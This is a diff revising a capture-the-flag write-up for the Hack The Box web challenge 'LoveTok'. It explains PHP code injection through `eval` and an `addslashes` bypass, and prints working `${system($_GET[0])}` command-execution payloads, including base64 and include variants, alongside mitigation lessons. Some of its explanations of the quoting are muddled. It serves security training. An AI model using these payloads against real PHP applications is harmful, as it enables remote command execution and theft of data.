@@ -4,7 +4,7 @@ type: Web
 difficulty: Easy
 platform: Hack The Box
 state: Retired
-tags: [web, php, code-injection, eval, ssti]
+tags: [web, php, code-injection, eval]
 ---
 
 # LoveTok — Hack The Box
@@ -15,65 +15,71 @@ tags: [web, php, code-injection, eval, ssti]
 
 ## TL;DR
 
-A date service takes the format from a parameter and drops it inside an `eval`. PHP's `addslashes` does not escape `${...}` or nested quotes, so a **PHP code injection** with `${system(...)}` runs commands.
+The controller takes `format` from `GET` and concatenates it inside an `eval` calling `date()`. `addslashes` escapes quotes and backslashes but **not** PHP's `${...}` interpolation: `${system($_GET[0])}` runs a command and reads the flag.
 
 ## Brief
 
 ```text
-/TimeController?format=r
+/?format=r
 ```
 
-Returns the date in `r` format. Changing `format` changes the output, which already hints at concatenation into a date function.
+Returns the date in `r` format. The source ships with the challenge: `controllers/TimeController.php` and `models/TimeModel.php`.
 
-## Analysis
+## Recon
 
-The controller is essentially:
+```bash
+curl -s 'http://<IP>:<PORT>/'
+curl -s 'http://<IP>:<PORT>/?format=Y-m-d'
+```
+
+Changing `format` changes the output: the input reaches the date function.
+
+## The flaw
 
 ```php
-class TimeModel {
-    public function __construct($format) {
-        $this->format = addslashes($format);
-        eval("return date('" . $this->format . "');");
-    }
+public function getTime() {
+    eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
+    return isset($time) ? $time : 'Something went terribly wrong';
 }
 ```
 
-`addslashes` escapes `'`, `"`, `\` and NUL. The payload uses no quotes: it uses PHP's **`${}` syntax**, interpolated inside strings and evaluating an arbitrary expression.
+`format` goes through `addslashes()` (escapes `'`, `"`, `\` and NUL). The payload needs **no quotes**: PHP interpolates `${expression}` inside double-quoted strings and evaluates it, so the quote closing `date("` is supplied as `${...}`.
 
 ## Exploitation
 
 ```text
-/TimeController?format=${system('cat /flag*')}
+/?format=${system($_GET[0])}&0=ls
 ```
 
-The final `eval` becomes:
+`system()` prints the output itself; `date()`'s value no longer matters. The flag is not in the current directory:
 
-```php
-return date('${system('cat /flag*')}');
+```text
+/?format=${system($_GET[0])}&0=cat+../flag*
 ```
-
-`system()` executes and `date()`'s return value is irrelevant: the command output is already printed.
 
 ```text
 HTB{<flag>}
 ```
 
-Useful variants when spaces or quotes are filtered:
+Alternatives when spaces or quotes are filtered:
 
 ```text
-${system($_GET[0])}          # then request ?0=cat+/flag*
-${phpinfo()}
-${include('/flag')}
+${system(base64_decode($_GET[0]))}      # with the command base64-encoded
+${include($_GET[0])}                    # to read a PHP/text file
 ```
 
-## Pitfalls
+## Evidence
 
-- **Single quotes**: if the app also escapes backslashes, `${system($_GET[0])}` avoids writing quotes in the payload.
-- **`eval` with `return`**: the expression must be valid inside `date('...')`; `${}` works because it resolves before the string is passed.
-- **URL encoding**: encode spaces as `+` or `%20` depending on the client.
+- Trimmed output; no flags.
+- Real values live in `private/`.
 
 ## Lessons
 
-- `eval` with user input is remote code execution, even when the author thinks they only control a date format.
-- `addslashes` is not a defence: use a format-character allowlist (`Y-m-d H:i:s`).
-- In PHP, `${}` inside double-quoted strings is interpolation with evaluation: a perfect injection sink.
+- **`addslashes` is not a defence**: `$`, `{` and `}` still pass.
+- **`${}` in double-quoted strings** is evaluated interpolation, not concatenation.
+- **The quote is unnecessary**: closing the string with `${` dodges the filter and keeps the code valid.
+- **`../`**: the flag is served one level above the `DocumentRoot`.
+
+- `eval` with user input is RCE, even when the author thinks only a format is controlled.
+- A parameter that "just" picks a date format deserves an allowlist, not a quote filter.
+- Mitigation: `date()` with allowed formats (`Y-m-d H:i:s`) and no `eval`.
